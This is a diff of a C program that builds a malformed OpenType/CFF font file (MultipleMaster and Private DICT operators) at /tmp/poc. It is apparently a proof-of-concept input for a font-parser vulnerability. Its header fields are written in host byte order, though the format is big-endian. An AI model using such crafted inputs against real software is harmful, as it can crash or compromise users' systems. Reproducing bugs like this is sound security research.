@@ -1,78 +1,75 @@
 #include <stdio.h>
-#include <stdint.h>
 #include <stdlib.h>
+#include <stdint.h>
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
     if (!f) { perror("fopen"); return 1; }
 
-    /* CFF2 header: major=2, minor=0, hdrSize=4, offSize=1 */
-    fputc(0x02, f); fputc(0x00, f); fputc(0x04, f); fputc(0x01, f);
+    /* OTF header with 'OTTO' */
+    uint32_t sfVersion = 0x4F54544F;
+    uint16_t numTables = 1;
+    uint16_t searchRange = 16;
+    uint16_t entrySelector = 0;
+    uint16_t rangeShift = 0;
+    fwrite(&sfVersion, 4, 1, f);
+    fwrite(&numTables, 2, 1, f);
+    fwrite(&searchRange, 2, 1, f);
+    fwrite(&entrySelector, 2, 1, f);
+    fwrite(&rangeShift, 2, 1, f);
 
-    /* Top DICT starts at offset 4 */
-    long top_start = ftell(f);
+    /* Table record for 'CFF ' */
+    uint32_t tag = 0x43464620;
+    uint32_t checksum = 0;
+    uint32_t offset = 28;
+    uint32_t length = 0;
+    fwrite(&tag, 4, 1, f);
+    fwrite(&checksum, 4, 1, f);
+    fwrite(&offset, 4, 1, f);
+    long len_pos = ftell(f);
+    fwrite(&length, 4, 1, f);
 
-    /* ROS: push 0, 1, 0, operator 0x0C 0x1E */
-    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);
-    fputc(0x0C, f); fputc(0x1E, f);
+    /* CFF data */
+    long cff_start = ftell(f);
 
-    /* FDSelect placeholder: push offset, operator 0x0C 0x1B */
-    long fd_op_pos = ftell(f);
-    fputc(0x00, f); fputc(0x0C, f); fputc(0x1B, f);
+    /* CFF header */
+    fputc(0x01, f); fputc(0x00, f); fputc(0x04, f); fputc(0x01, f);
 
-    /* Private placeholder: push size, offset, operator 0x12 */
-    long priv_op_pos = ftell(f);
-    fputc(0x00, f); fputc(0x00, f); fputc(0x12, f);
-
-    /* CharStrings placeholder: 0x1C, 2-byte offset, 0x11 */
-    long char_op_pos = ftell(f);
-    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); fputc(0x11, f);
-
-    /* Global Subrs INDEX: count=0 */
-    fputc(0x00, f); fputc(0x00, f);
-
-    /* CharStrings INDEX */
-    long char_off = ftell(f);
+    /* Name INDEX: count=1 */
     fputc(0x00, f); fputc(0x01, f);
     fputc(0x01, f);
     fputc(0x01, f); fputc(0x02, f);
-    fputc(0x8B, f);
+    fputc(0x41, f);
 
-    /* FDSelect table: Format 0 */
-    long fd_off = ftell(f);
-    fputc(0x00, f);              /* format = 0 */
-    fputc(0x00, f); fputc(0x01, f); /* nGlyphs = 1 */
-    fputc(0x00, f);              /* fds[0] = 0 */
-
-    /* Private DICT */
-    long priv_off = ftell(f);
-    fputc(0x00, f); fputc(0x0F, f); /* vsindex = 0 */
-    /* First blend */
-    fputc(0x01, f); fputc(0x02, f); fputc(0x03, f); fputc(0x04, f); fputc(0x05, f);
-    fputc(0x01, f); fputc(0x16, f);
-    /* Second blend */
-    fputc(0x06, f); fputc(0x07, f); fputc(0x08, f); fputc(0x09, f); fputc(0x0A, f);
-    fputc(0x01, f); fputc(0x16, f);
-
-    long priv_sz = ftell(f) - priv_off;
-
-    /* Patch FDSelect operator */
-    fseek(f, fd_op_pos, SEEK_SET);
-    fputc((unsigned char)fd_off, f);
-    fputc(0x0C, f); fputc(0x1B, f);
-
-    /* Patch Private operator */
-    fseek(f, priv_op_pos, SEEK_SET);
-    fputc((unsigned char)priv_sz, f);
-    fputc((unsigned char)priv_off, f);
+    /* Top DICT INDEX: count=1, offSize=1 */
+    fputc(0x00, f); fputc(0x01, f);
+    fputc(0x01, f);
+    fputc(0x01, f); fputc(0x0D, f);
+    /* MultipleMaster: num_designs=2, axes=0,0,0,0 */
+    fputc(0x8D, f);
+    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f);
+    fputc(0x0C, f); fputc(0x18, f);
+    /* Private: size=8, offset=34 */
+    fputc(0x93, f);
+    fputc(0xAD, f);
     fputc(0x12, f);
 
-    /* Patch CharStrings operator */
-    fseek(f, char_op_pos, SEEK_SET);
-    fputc(0x1C, f);
-    fputc((unsigned char)(char_off >> 8), f);
-    fputc((unsigned char)(char_off & 0xFF), f);
-    fputc(0x11, f);
+    /* String INDEX: empty */
+    fputc(0x00, f); fputc(0x00, f);
+
+    /* Global Subr INDEX: empty */
+    fputc(0x00, f); fputc(0x00, f);
+
+    /* Private DICT at offset 34 */
+    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8D, f); fputc(0x17, f);
+    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8D, f); fputc(0x17, f);
+
+    long cff_end = ftell(f);
+    long cff_len = cff_end - cff_start;
+
+    /* Patch CFF table length */
+    fseek(f, len_pos, SEEK_SET);
+    fwrite(&cff_len, 4, 1, f);
 
     fclose(f);
     return 0;
